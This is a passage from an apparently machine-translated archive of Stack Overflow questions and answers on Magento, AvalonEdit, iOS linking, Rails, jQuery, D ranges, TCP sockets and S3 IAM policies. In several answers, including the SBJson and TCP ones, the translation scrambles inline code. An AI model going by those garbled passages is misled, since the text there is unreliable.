#20 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Template.php(272): Mage_Core_Block_Template->fetchView('frontend\base\d...')
#21 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Template.php(286): Mage_Core_Block_Template->renderView()
#22 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Block\Abstract.php(863): Mage_Core_Block_Template->_toHtml()
#23 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Model\Layout.php(529): Mage_Core_Block_Abstract->toHtml()
#24 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Controller\Varien\Action.php(391): Mage_Core_Model_Layout->getOutput()
#25 C:\xampp\htdocs\magento\app\code\core\Mage\Catalog\controllers\CategoryController.php(159): Mage_Core_Controller_Varien_Action->renderLayout()
#26 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Controller\Varien\Action.php(420): Mage_Catalog_CategoryController->viewAction()
#27 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Controller\Varien\Router\Standard.php(250): Mage_Core_Controller_Varien_Action->dispatch('view')
#28 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Controller\Varien\Front.php(176): Mage_Core_Controller_Varien_Router_Standard->match(Object(Mage_Core_Controller_Request_Http))
#29 C:\xampp\htdocs\magento\app\code\core\Mage\Core\Model\App.php(349): Mage_Core_Controller_Varien_Front->dispatch()
#30 C:\xampp\htdocs\magento\app\Mage.php(640): Mage_Core_Model_App->run(Array)
#31 C:\xampp\htdocs\magento\index.php(80): Mage::run('', 'store')
#32 {main}";s:3:"url";s:36:"/magento/index.php/category-2-1.html";s:11:"script_name";s:18:"/magento/index.php";s:4:"skin";s:7:"default";} 
```

# avalonedit - AvalonEdit - 搜索完成数据

> ID：11603549
> 
> 赞同：0
> 
> 时间：2012-07-22T20:00:29.110
> 
> 标签：avalonedit

我已经连接了 CompletionData 没问题，将等插入 Avalon Edit 控件。

挑战在于搜索算法。

在下面的示例中，我希望***new-obj***在列表中“匹配” ***New-Object**** 而不是在 ***New-DataObject* 上进行部分查找**。

有我可以设置的标志吗？还是我需要覆盖搜索并实现我自己的？

谢谢

道格

[http://dougfinke.com/Stackoverflow/avalonedit.png](http://dougfinke.com/Stackoverflow/avalonedit.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T22:02:02.483

不幸的是，此行为当前不可自定义。它在私有方法中被硬编码`CompletionList.GetMatchQuality`。

也就是说，我无法重现您的问题。AvalonEdit 匹配逻辑不像您的屏幕截图所暗示的那样工作。AvalonEdit 支持 8 种匹配类型（较高的匹配优先于其他匹配）：

```
 //      8 = full match case sensitive
        //      7 = full match
        //      6 = match start case sensitive
        //      5 = match start
        //      4 = match CamelCase when length of query is 1 or 2 characters
        //      3 = match substring case sensitive
        //      2 = match substring
        //      1 = match CamelCase 
```

“new-obj”是“New-Object”的类型 5 匹配，而“New-DataObject”则完全不匹配。

完成窗口可疑地显示在单词 start 的右侧。我认为只有“obj”在您的完成部分中。您必须检查找到单词 start 和 sets 的代码`CompletionWindow.StartOffset`，我怀疑它正在考虑将破折号作为单词边框。

# ios - 重复符号错误：SBJsonParser.o？

> ID：11603551
> 
> 赞同：5
> 
> 时间：2012-07-22T20:00:48.650
> 
> 标签：ios, duplicates, symbols, sbjson

我目前在我的项目中有 ShareKit，它被编译为静态库。它得到了适当的实施。我还通过将亚马逊的框架添加到我的项目中来实施亚马逊的 AWS 开发工具包。

似乎重复的符号来自亚马逊的 AWS 开发工具包文件“AWSIOSSDK”。这是它的样子：

![在此处输入图像描述](../Images/4a832874ae467171b4ca40f7d86255bc.png)

该文件与 ShareKit 的文件 libShareKit.a 发生冲突。这是该文件的样子：

![在此处输入图像描述](../Images/6be238944e91fb87def75ad31c019bb3.png)

无论如何，这两个文件都是我以前从未见过的文件。似乎一些 JSON 文件在其中发生冲突。

我查看了其他 SO 问题，他们说要对已编译的源代码做一些事情，但这些文件都不是来自任一库的已编译源代码。

这是 Xcode 给出的确切错误：

```
ld: duplicate symbol _OBJC_CLASS_$_SBJsonParser 
```

无论如何，有人知道我应该做什么吗？除非我解决此问题，否则我的应用程序无法编译。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T20:42:33.190

您可以继续将库存档拆分为其目标文件，然后通过删除重复项再次合并它们。

请参阅以下演练以获得管理该任务的想法： [通过从静态库中删除类来避免链接期间重复的符号错误](http://atnan.com/blog/2012/01/12/avoiding-duplicate-symbol-errors-during-linking-by-removing-classes-from-static-libraries/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-22T20:40:22.990

这两个都内置`SBJsonParser`在他们的静态库中。这不是构建静态库的正确方法。每个都应该在没有的情况下构建`SBJson`，然后您应该将所有它们与`SBJson`. 有几个解决方案：

*   重建这些库（或让他们的维护者这样做）以不将第三方库直接包含到静态库中。这是理想的解决方案。
*   使用.`SBJson`从文件中删除不正确的文件。您应该能够使用列出其中的对象然后删除不应该在其中的对象来执行此操作。您当然也可以提取所有文件并直接链接它们。`.a``ar``ar -t``.a``ar -d``ar -x``.o`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-11-04T09:49:51.933

我对 FaceBookConnect 框架（我们称之为项目 B）和我的项目（项目 A）有同样的问题。两者都再次链接 JSON 框架。

解决方案是：

1.  转到项目 B > 目标 > 构建阶段 > 从“将二进制文件与库链接”中删除 JSON
2.  确保 JSON 框架仍在项目中（不要删除它），以便项目 B 可以构建
3.  构建你的项目 B 你不应该得到任何错误。该项目应构建但不嵌入 JSON 框架符号
4.  在项目 A 中添加项目 B 产品（一个框架）和 JSON 框架
5.  转到项目 A > 目标 > 构建阶段并检查项目 B 和 JSON 是否已添加到“将二进制文件与库链接”部分
6.  构建你的项目

问候，

# ruby-on-rails - 了解 Rails 3 目录结构

> ID：11603553
> 
> 赞同：3
> 
> 时间：2012-07-22T20:00:59.450
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我在网上找到了几个解释 Rails 应用程序的 DIR 结构的网站，但我仍然不清楚一些，主要是：

```
/vendor
/lib
/public 
```

应该去哪里？我想知道最佳实践。例如，我有 jQuery 插件，它们应该位于 /vendor 中吗？/上市？/库？我已经从不同的网站在线阅读了所有 3 个。

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T20:12:05.093

供应商是第三方代码/库，所以，是的，是 jQuery 插件的好地方。

Public 用于静态资产，即在资产管道中没有任何好处的东西。

Lib 通常用于包含不特定于应用程序的代码。即您在多个应用程序中使用的东西。有一种趋势是将域逻辑放入 lib，例如不基于 ActiveModel 的域类。Gary Bernhardt (https://www.destroyallsoftware.com/) 是这一点的支持者。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-22T20:17:05.510

通常 /public 的内容直接由 Web 服务器（nginx、apache 等）提供，而无需 Rails 的干预，因此传统上您的所有静态资产（图像、样式表、javascript 等）都放在此处。你仍然可以把你的javascript放在那里，但它有点过时了。

Rails 3.1 引入了改变这一切的[资产管道。](http://guides.rubyonrails.org/asset_pipeline.html)app/assets、lib/assets 和 vendor/assets 中的资产都通过资产管道启动服务器。通常，您的应用程序特定资产将放在 app/assets 中，而 3rd 方库（例如查询插件）将放在 vendor/assets 中。如果您正在开发自己的一组 jquery 插件，您可以将它们放在 lib/assets 中。不管你把它们放在哪里，资产都会“工作”——这只是一个组织问题。

Gems 也可以有自己的资产文件夹，例如 jquery-rails gem 捆绑 jquery 并允许您的应用程序提供 jquery 而无需实际将其复制到您的应用程序中。我发现这比把东西放在供应商/资产中更整洁。

# javascript - Jquery下拉菜单验证

> ID：11603558
> 
> 赞同：0
> 
> 时间：2012-07-22T20:01:15.523
> 
> 标签：javascript, jquery, json, forms, validation

我在 html 中有一个简单的下拉菜单。html代码如下所示。

```
<select id="dmm_ios">
  <option value="1.0.0">1.0.0</option>
  <option value="1.1.1">1.1.1</option>
  <option value="1.2.3">1.2.3</option>
  ....The options available go on and on..
</select> 
```

我也有类似于下拉菜单的 json 代码。我的目标是检查用户选择了哪个选项，然后我希望能够查看哪些 json 对象具有相似的值。

我以为我会比较值，所以我做了这样的事情......

```
var ios = $("#ddm_ios").val();

if ($.inArray(ios, Products.iphone4.GeveyPro.ios) === -1) {

} else {

} 
```

但我不确定代码是否有效。所以我尝试一些简单的东西。我试图找到“typeof ios”，结果我得到了未定义的结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:04:14.850

您有一个错字：`ddm_ios`在您的选择器中应该`dmm_ios`与下拉列表的实际 id 匹配，反之亦然。

```
var ios = $("#dmm_ios").val(); 
```

# extjs - ExtJS 4 - 在面板中拖放图像

> ID：11603560
> 
> 赞同：1
> 
> 时间：2012-07-22T20:01:24.883
> 
> 标签：extjs

我正在将图像添加到这样的面板上：

```
var mypanel = this.getMyPanel2();
element = Ext.create('Ext.Img', {    
src: 'http://www.sencha.com/img/20110215-feat-html5.png',
renderTo: Ext.getBody()
});
mypanel.add(element); 
```

（MyPanel2 是 Ext.panel.Panel）

图像被正确添加。

现在我正在尝试在此面板中拖放图像。首先，我尝试将面板设置为可拖动，但这仅允许面板被拖动。

我是否必须将此面板设置为放置区域，以便可以拖放图像？

提前谢谢了！

米

# jquery-mobile - Codeigniter 中的 PhoneGap + RESTful 服务器（响应标头，但响应为空）

> ID：11603563
> 
> 赞同：0
> 
> 时间：2012-07-22T20:01:46.817
> 
> 标签：jquery-mobile, cordova, codeigniter-2

我有一个运行 Codeigniter 的服务器，我使用的是 Phil Sturgeon 的 REST API。控制器工作正常，我使用 SOAPUI 使用服务并且工作完美，但是当我使用 JQuery Mobile 在页面中执行此操作并使用 Firebug 进行调试时，服务器返回标头响应，但根本没有响应。我更改了 URL，尝试使用 graph facebook api 并且页面有效，我几乎做了所有事情。为什么我的服务不起作用。这是什么原因？？？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-27T12:20:19.033

我正在使用 phonegap-1.8 (cordova-1.8.0.js)，我发现我必须编辑`res\xml\cordova.xml`添加：

```
<access origin="http://mydomain.com*"/> 
```

就在现有的`access origin="http://127.0.0.1*"`.

# foreach - 如何使 Range 与 foreach 语句一起使用

> ID：11603564
> 
> 赞同：3
> 
> 时间：2012-07-22T20:01:47.037
> 
> 标签：foreach, range, d

我有以下范围：

```
struct Range {
  uint data;

  @property{
    bool empty() { return false; }
    uint front() { return data; }
    void popFront() { data = data * 2 + 1; }
  }
} 
```

尝试使用它， `foreach(c; Rnage()){ /*...*/ }`工作，但`foreach(i, c; Range()){ /*...*/ }`我得到：

```
Error: cannot infer argument types 
```

我需要`i`类似的东西`foreach(i, v; [1,2,3,4]){ }`。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-23T00:03:50.490

范围不支持语法

```
foreach(i, c; range) 
```

虽然这似乎很明显应该在简单的情况下工作，但该索引甚至应该是取决于范围的类型并且并不总是有意义。因此，foreach 不会自动提供索引计数器，范围也无法提供。

但是，由于[使用 foreach 解包元组](http://d.puremagic.com/issues/show_bug.cgi?id=6366)，您可以通过使用您的范围来完成：[`std.range.sequence`](http://dlang.org/phobos/std_range.html#sequence) [`std.range.zip`](http://dlang.org/phobos/std_range.html#zip)

```
foreach (i, e; zip(sequence!"n"(), range))
{
} 
```

顺便说一句，你不应该`popFront`用`@property`. 这没有任何意义。`popFront`不接受任何参数并且不返回任何值。它根本不像一个变量。属性的重点是具有像变量一样起作用的函数。If/when`-property`的实现被完全整理出来并成为正常行为（目前它相当有问题，这就是为什么它目前是一个单独的开关的部分原因），`popFront`因为你定义它是不可用的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-23T01:59:18.420

如果您使用`opApply`实现范围，您可以为无索引样式和有索引样式重载一个版本：

```
struct Range {
    int opApply(int delegate(int) action){
        uint data=0;
        while(true){
            action(data);
            data=data*2+1;
        }
        return 0;
    }

    int opApply(int delegate(uint,int) action){
        uint i=0;
        foreach(element;this){
            action(i++,element);
        }
        return 0;
    }
} 
```

# factory-pattern - OOD - 如何设计和构建项目以避免重新部署主应用程序（工厂模式？）

> ID：11603567
> 
> 赞同：0
> 
> 时间：2012-07-22T20:02:06.580
> 
> 标签：factory-pattern, circular-reference, project-structure, build-time

我想检查一下我对使用和实现工厂模式的理解。假设我正在设计一个应用程序来玩几个游戏（国际象棋、扑克）。游戏是从以下来源之一加载的：CSV、XML，但我希望能够在不重新编译/重新部署应用程序的情况下添加新来源（比如 DB）。我只想部署工厂逻辑和新加载器

这暗示了游戏加载器的工厂模式，类似于以下内容，但由于具体加载器返回一个列表，因此会导致循环依赖。

```
Application.prj has reference to AbstractFactory.prj
-----------------------

    main ()
    List<Game> games = LoadGameFactory.Create(src).Load(src)
    foreach(game in games) game.play();

abstract class Game { .. abstract void Play(); ..}
class Chess : Game  { .. void   Play() ..}
class Poker : Game  { .. void   Play() ..}

Factory.prj has reference to Application.prj
------------------------
class LoadGameFactory { 
    GameLoader Create(string src)
    {
        if(src == csv) return new LoadCSVGames().Load(src)
        else           return new LoadXMLGames().Load(src)      
    }
}
class GameLoader{ List<Game> Load(src) }

class CSVLoader : GameLoader
{
    List<Game> Load(src){ ... logic to create Chess() and Poker() from CSV file}
}

class XMLLoader : GameLoader
{
    List<Game> Load(src)    { ... logic to create Chess() and Poker() from XML file}
} 
```

我找到的解决方案是创建一个新项目 Application.Model，在其中移动 Game、Chess 和 Poker，ecc 这样，Application.prj 和 Factory.prj 将只需要引用 Application.Model。并且添加数据库源只需要 factory.prj 重新编译和部署。

这是要走的路吗？或者有没有办法实现工厂模式以获得相同的结果。我不想反思。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:07:46.917

听起来你想要一个基于插件的设计。我假设这是 C#。你要做的是设计一组严格的接口，定义游戏、游戏加载器等。然后你`Assembly.LoadFrom()`用来加载所有的 DLL，并使用反射来获取从这些接口继承的导出类，从那些程序集，并实例化新对象。

# php - PHP Jquery time bandwidth

> ID：11603569
> 
> 赞同：0
> 
> 时间：2012-07-22T20:02:24.603
> 
> 标签：php, jquery

I'm new with Jquery and payed someone to developed a script for me. I notice when I add this script to my website my bandwidth jumps from 1mb's to 5mb's. I have a lot of users on so it leaves me to believe the Jquery part is refreshing to quickly. My question is what do I need to change so it will stop using so much bandwidth in the script below.

Thank you!

```
<script>

current_time = 1342987067;
start_at = 1342986987;
waiting_time = 120;
break_time = 9999;
view_1 = 'Text removed for example<br>';
view_2 = 'Text removed for example<b><span id="countdown-value"></span></b> seconds.<br>';
view_3 = 'Text removed for example... currently in progress...<br>';
winner = "Text removed for example";

function changeView() {
    if (start_at + waiting_time > current_time) {
        if (break_time < waiting_time) {
            return view_1 + "\n" + winner;
        } else {
            return view_2 + "\n" + winner;
        }
    } else {
        return view_3 + "\n" + winner;
    }
}

function setView() {
    $("#countdown-holder")[0].innerHTML = changeView();
}

function reload() {
    current_time ++;
    break_time = start_at + waiting_time - current_time;
    setView();
    if (break_time <= waiting_time) {
        if ($("#countdown-value")[0] != null)
            $("#countdown-value")[0].innerHTML = break_time;
    } else {
        if ($("#countdown-value")[0] != null)
            $("#countdown-value")[0].innerHTML = break_time - waiting_time;
    }
    setTimeout("reload()", 1000);
}
setTimeout("reload()", 1000);
setView();

</script>
<script>

function setBreakTimeCountdown() {

    breakTimeCountdown = parseInt($("#countdown-value")[0].innerHTML);

    breakTimeCountdown --;

    if (breakTimeCountdown < 0) {

        breakTimeCountdown = 0;

        reload();

    }

    $("#countdown-value")[0].innerHTML = breakTimeCountdown;

    setTimeout("setBreakTimeCountdown()", 1000);

}

setTimeout("setBreakTimeCountdown()", 1000);

</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:09:36.900

None of the calls in that piece of javascript appear to be triggering any requests directly.

However, if any of the variables `view_1`, `view_2`, `view_3`, and `winner` were to contain HTML that has references to other media resources in them, that could trigger more requests to your server, which would increase bandwidth utilization.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:07:46.127

Nothing in the script seems to be calling back to your site, so I'm guessing it's loading jQuery itself that's the issue?

Easiest solution would be to use the [Google Libraries API](https://developers.google.com/speed/libraries/devguide). Scroll down and get the jQuery link, and replace your local jQuery with that. It will use Google's bandwidth instead.

# tcp-ip - TCP/IP 的正常数据包接收率

> ID：11603571
> 
> 赞同：0
> 
> 时间：2012-07-22T20:02:36.283
> 
> 标签：tcp-ip

我有一个使用两台笔记本电脑的实验装置，一台作为发射器，另一台作为接收​​器。发送器根据已配置的不同定时器的时间段，不断地发送不同大小的数据包。接收器捕获这些数据包并在程序终止时计算 PRR。

发射器和接收器之间的距离约为 6-7 英尺

对于这种 TCP/IP 设置，0.87 的数据包接收率是正常的还是偏低？

发射机：

```
 void sendMedicalStream(void) {

  timer_count ++;

  if(timer_count % 5 ==0) {        

  memcpy(pu8 ,(struct pulse_oxim_packet*)& oxim_packet , sizeof(struct 
              pulse_oxim_packet));
   x=send(s,pu8,sizeof(u8aSendBuffer),0); 
  }

  if(timer_count % 50 == 0) {    
   memcpy(pu8 ,(struct ecg_data*)& wifi_ecg_data , sizeof(struct ecg_data));
   x=send(s,pu8,sizeof(u8aSendBuffer),0);
  }

   if(timer_count % 10 == 0) {  
   memcpy(pu8 ,(struct resp_monitor_packet*)& rsp_mon_packet , sizeof(struct   
                                                              resp_monitor_packet));
   x=send(s,pu8,sizeof(u8aSendBuffer),0);
    }

    if(timer_count % 120 == 0) {  
    memcpy(pu8 ,(struct self_check_glucose_monitor_packet*)& gm_packet , sizeof(struct 
                           self_check_glucose_monitor_packet));
    x=send(s,pu8,sizeof(u8aSendBuffer),0);
   }

     if(timer_count % 30 == 0) {  
    memcpy(pu8 ,(struct self_check_weight_monitor*)& wm_packet , sizeof(struct 
                                                   self_check_weight_monitor));
     x=send(s,pu8,sizeof(u8aSendBuffer),0);
    }

  if(timer_count % 25 == 0) {  
   memcpy(pu8 ,(struct asthma_monitor*)& as_mon_packet , sizeof(struct asthma_monitor));
   x=send(s,pu8,sizeof(u8aSendBuffer),0);
   }

  if(timer_count % 35 == 0) {  
    memcpy(pu8 ,(struct  sc_blood_press_mon_packet*)& bp_mon_packet , sizeof(struct 
                      sc_blood_press_mon_packet));
    x=send(s,pu8,sizeof(u8aSendBuffer),0);
  }

 if(timer_count % 45 == 0) {  
  memcpy(pu8 ,(struct  insulin_pump_packet*)& ins_pump_packet , sizeof(struct 
                         insulin_pump_packet));
   x=send(s,pu8,sizeof(u8aSendBuffer),0);
  }

  if(timer_count % 15 == 0) { 
   memcpy(pu8 ,(struct  fetal_heart_monitor *)& fhm_packet , sizeof(struct 
                            fetal_heart_monitor));
    x=send(s,pu8,sizeof(u8aSendBuffer),0);
  }
   if(timer_count % 180 == 0) {  
   memcpy(pu8 ,(struct dialysis_machine *)& dial_mach_packet , sizeof(struct 
                      dialysis_machine));
   x=send(s,pu8,sizeof(u8aSendBuffer),0);

  }

  if(timer_count == 10000)
   timer_count = 0;
  }

 int main(int argc,char **argv)
  {

struct sockaddr_in sin;

 /* Packet Title DEtails */
    strcpy(fhm_packet.title,"Fetal-Heart-Rate-Monitor");
    strcpy(bp_mon_packet.title,"Blood-Pressure-Monitor");
    strcpy(ins_pump_packet.title,"Insulin-Pump-Monitor");
    strcpy(wm_packet.title,"Weight-Monitor");
    strcpy(as_mon_packet.title,"Asthma-Monitor");
    strcpy(gm_packet.title,"Glucose-Level-Monitor");
    strcpy(rsp_mon_packet.title,"Infant-Respiratory-Monitor");
    strcpy(dial_mach_packet.title,"Dialysis-Machine");

    /* Socket Details */   
    len=sizeof(struct sockaddr);

    if(argc==2){
    host =argv[1];
    }

   /* translates the host name into peer's IP address */

   hp=gethostbyname(host);
    if(!hp){
    fprintf(stderr,"duplex-talk : uknown host : %s\n",host);
    exit(1);
    }

   /* build address data structures */

    bzero((char *)&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    bcopy(hp->h_addr,(char *)(&sin.sin_addr),hp->h_length);
    sin.sin_port = htons(SERVER_PORT);

     /* active open */
    if((s = socket(PF_INET,SOCK_STREAM,0))<0) {
    perror("duplex-talk : socket");
    exit(1);
     }

    if(connect(s, (struct sockaddr *)&sin, sizeof(sin)) <0) {
    perror("duplex-talk : connect");
    exit(1);
   }

  /* Timer Details */

  struct itimerval it_val;  /* for setting itimer */

   if (signal(SIGALRM, (void (*)(int)) sendMedicalStream) == SIG_ERR) {
   perror("Unable to catch SIGALRM");
    exit(1);
   }

   it_val.it_value.tv_sec =     MIN_INTERVAL/1000;
   it_val.it_value.tv_usec =    (MIN_INTERVAL*1000) % 1000000;   
   it_val.it_interval = it_val.it_value;

   if (setitimer(ITIMER_REAL, &it_val, NULL) == -1) {
   perror("error calling ECG setitimer()");
   exit(1);
   }

 /* main loop : get and send lines of text */
  int i=0,j=0;  
 while(1);

 } 
```

接收者 ：

```
 int main(int argc,char *argv)
  {
   char * pu8 = u8aSendBuffer;
   signal(SIGINT,INThandler);
struct sockaddr_in sin;
struct sockaddr addr;
socklen_t fromlen;
char buf[MAX_LINE];

len=sizeof(struct sockaddr);

/* build address data structues */

bzero((char *)&sin, sizeof(sin));
sin.sin_family = AF_INET;
sin.sin_addr.s_addr = INADDR_ANY;
sin.sin_port = htons(SERVER_PORT);

/* setup passive open*/

if((s=socket(PF_INET,SOCK_STREAM,0))<0) { 
      perror("duplex-talk:socket");
       exit(1);
   }

   if((bind(s,(struct sockaddr *)&sin, sizeof(sin))) < 0){

    perror("duplex-talk: bind");
    exit(1);
   }

    // listen
  listen(s,MAX_PENDING);

    if((new_s = accept(s,(struct sockaddr *)&sin, &len)) < 0) {
    perror("duplex-talk : accept");
     exit(1);
  }

  while(1)
  {

    recv(new_s,pu8,sizeof(u8aSendBuffer),0);

    p_ptr = (struct pulse_oxim_packet *)pu8;
    ecg_ptr = (struct ecg_data *)pu8;
    resp_mon_ptr = (struct resp_monitor_packet *)pu8;
    gmon_ptr = (struct self_check_glucose_monitor_packet *)pu8;
    wmon_ptr = (struct self_check_weight_monitor *)pu8;
    asmon_ptr = (struct asthma_monitor *)pu8;
    bp_mon_ptr = (struct sc_blood_press_mon_packet *)pu8;
    ins_pump_packet = (struct insulin_pump_packet *)pu8;
    ft_mon_ptr = (struct fetal_heart_monitor *) pu8; 
    dial_mach_ptr = (struct dialysis_machine *) pu8;     

  if( p_ptr != NULL && strcmp(p_ptr->title,"Pulse-Oximeter-Data") == 0) 
    recv_count++;
  if( ecg_ptr != NULL &&  strcmp( ecg_ptr->title,"ECG-Monitor-Data") == 0 )
    recv_count++;
  if( gmon_ptr != NULL &&  strcmp( gmon_ptr->title,"Glucose-Level-Monitor") == 0 )
     recv_count++;
  if( asmon_ptr != NULL &&  strcmp( asmon_ptr->title,"Asthma-Monitor") == 0 )
     recv_count++;
  if(wmon_ptr != NULL &&  strcmp( wmon_ptr->title,"Weight-Monitor") == 0 )
     recv_count++;
    if( ins_pump_packet != NULL && strcmp( ins_pump_packet->title,"Insulin-Pump-Monitor") 
                             == 0)
     recv_count++;
  if( bp_mon_ptr != NULL &&  strcmp(bp_mon_ptr->title,"Blood-Pressure-Monitor") == 0 )
     recv_count++;
  if( ft_mon_ptr != NULL &&  strcmp( ft_mon_ptr->title,"Fetal-Heart-Rate-Monitor") == 0 )
     recv_count++;
   if( dial_mach_ptr != NULL &&  strcmp( dial_mach_ptr->title,"Dialysis-Machine") == 0 )
     recv_count++;
   }

   return 0;
  } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:06:01.693

我不是网络专家，但如果您的发射器*持续*传输数据包，则很可能会比通常情况下对 ACK 数据包产生更多的干扰。

我的猜测是，如果您稍微修改它以使其不会使连接饱和，您会发现您获得更高的数据包接收率。

编辑：看过你的代码后，我相信一个可能的问题是，即使你已经*创建*了一个基于流的套接字，你并没有*把*它当作一个套接字——你假设每次`recv`调用都会得到一个数据包：

```
recv(new_s,pu8,sizeof(u8aSendBuffer),0); 
```

您应该使用 from 的返回值来查看*实际*收到`recv`了多少字节。

 *由于接收窗口非常小（我不知道是什么），在这种情况下你*可能*会忽略它，`sizeof(u8aSendBuffer)`但通常你*不*应该像你一样将流视为数据包序列：您应该将其视为数据流，您可能会或可能不会收到您要求的尽可能多的数据。*

# drupal - 覆盖drupal 7的theme_form

> ID：11603577
> 
> 赞同：0
> 
> 时间：2012-07-22T20:04:08.517
> 
> 标签：drupal, themes, overriding

我正在尝试按`uc_attribute`模块覆盖 theme_form 函数。该功能是`theme_uc_attribute_add_to_cart`drupal ubercart 属性的主题。有没有办法在我的模块中覆盖这个函数。我想覆盖我的功能，因为我不想按照drupal标准触摸这个功能。

谢谢大家

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T19:51:58.090

您可以使用以下语法 THEMENAME_uc_attribute_add_to_cart 在您的主题 template.php 文件中覆盖它

将 THEMENAME 替换为主题的名称。

# amazon-s3 - PUT/Sync 的必要 s3cmd S3 权限

> ID：11603583
> 
> 赞同：17
> 
> 时间：2012-07-22T20:04:47.470
> 
> 标签：amazon-s3, amazon-web-services, s3cmd

在迁移到 AWS EC2 时，我想限制我的实例的用户权限是有充分理由的。实例需要做的一件事是访问 S3 上的文件并在那里写入文件。但是，**如果不授予该用户所有权限，我找不到任何方法来实现这一点**。

s3cmd 允许我在我授予策略权限的 s3 存储桶上调用“ls”和“du”，但在尝试与这些文件夹之一进行 PUT/同步时总是失败并出现 403 错误。如果我使用我的根凭据，则传输会直接进行。

所以，我不明白为什么如果我将所有权限授予用户所述存储桶，它不能 PUT，但如果我给它**arn:aws:s3:::*** (所有存储桶) 那么它可以。对我来说毫无意义。

以前有其他人处理过这个吗？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-07-24T14:30:23.190

尝试这样的事情。我认为问题在于您需要 s3:ListAllMyBuckets 和 s3:ListBuckets 才能使 s3cmd 工作。不知道为什么，但除非它可以获得桶列表，否则它不会工作。我第一次尝试对 s3cmd 使用权限时遇到了同样的问题，这就是解决方案。

```
{
  "Statement": [
    {
      "Action": [
        "s3:ListAllMyBuckets"
      ],
      "Effect": "Allow",
      "Resource": "arn:aws:s3:::*"
    },
    {
      "Action": [ 
          "s3:ListBucket", 
          "s3:PutObject",
          "s3:PutObjectAcl"
      ],
      "Effect": "Allow",
      "Resource": [
          "arn:aws:s3:::bucket/path", 
          "arn:aws:s3:::bucket/path/*"
      ]
    }
  ]
} 
```

**编辑**我已经添加了`s3:PutObjectAcl`较新版本的 s3cmd 所需的操作，如下面的 Will Jessop 所述。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-04-18T17:29:50.820

bwight 的答案几乎是正确的（它可能曾经用于旧版本的 s3cmd），但我需要添加一个`s3:PutObjectAcl`才能让它工作：

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "Stmt123456",
      "Effect": "Allow",
      "Action": [
        "s3:ListAllMyBuckets"
      ],
      "Resource": [
        "arn:aws:s3:::*"
      ]
    },
    {
      "Sid": "Stmt123457",
      "Effect": "Allow",
      "Action": [
        "s3:ListBucket",
        "s3:PutObject",
        "s3:PutObjectAcl"
      ],
      "Resource": [
        "arn:aws:s3:::bucketname",
        "arn:aws:s3:::bucketname/*"
      ]
    }
  ]
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2015-05-20T13:52:24.887

我试图上传大文件，但该策略对我来说效果不佳，我结束了向用户添加下一个策略：

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "Stmt1397834652000",
            "Effect": "Allow",
            "Action": [
                "s3:ListAllMyBuckets"
            ],
            "Resource": [
                "arn:aws:s3:::*"
            ]
        },
        {
            "Sid": "Stmt1397834745000",
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:GetBucketLocation",
                "s3:AbortMultipartUpload",
                "s3:GetObjectAcl",
                "s3:GetObjectVersion",
                "s3:DeleteObject",
                "s3:DeleteObjectVersion",
                "s3:GetObject",
                "s3:PutObjectAcl",
                "s3:PutObject",
                "s3:GetObjectVersionAcl"
            ],
            "Resource": [
                "arn:aws:s3:::my_bucket",
                "arn:aws:s3:::my_bucket/*"
            ]
        }
    ]
} 
```

其中 my_bucket 是我需要通过 s3cmd 管理文件的存储桶

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-02-12T13:44:11.330

如果您要访问子文件夹（如 /bucket-name/path/ 的原始答案）而不是整个存储桶，则**ListBucket**操作需要更多的特异性：

```
{
    "Sid": "AllowListingOfFilesInFolder",
    "Effect": "Allow",
    "Action": [
        "s3:ListBucket"
    ],
    "Resource": [
        "arn:aws:s3:::bucket-name"
    ],
    "Condition": {
        "StringLike": {
            "s3:prefix": [
                "path/*"
            ]
        }
    }
} 
```

如果您提供对整个存储桶的访问权限，我相信它也适用于原始答案。

# android - 无法从 CursorWindow 读取第 1 行 col -1。确保在从光标访问数据之前正确初始化光标

> ID：11603585
> 
> 赞同：8
> 
> 时间：2012-07-22T20:05:19.083
> 
> 标签：android, expandablelistview, android-cursor

我正在实现一个**ExpandableListView** 并且对于每个组，它显示孩子，每个孩子都有自己的持续时间，并且该组显示孩子的所有持续时间的总和。

但是，当我单击一个孩子时，它会显示错误：

> 无法从 CursorWindow 读取第 1 行 col -1。确保在从光标访问数据之前正确初始化光标。

而且我没有调用方法`setOnChildClickListener`。即使我调用它，当我单击孩子时，当我放置断点时它也不会停止。

**这就是问题所在，我找不到错误在哪里，因为堆栈跟踪没有指向我项目的类，而是指向 android native 的类。我尝试在代码的每个部分都设置断点，但是当我单击一个孩子时，没有一个断点到达。**

顺便说一下，我使用**ViewHolder**模式来处理视图，适配器是**CursorTreeAdapter**

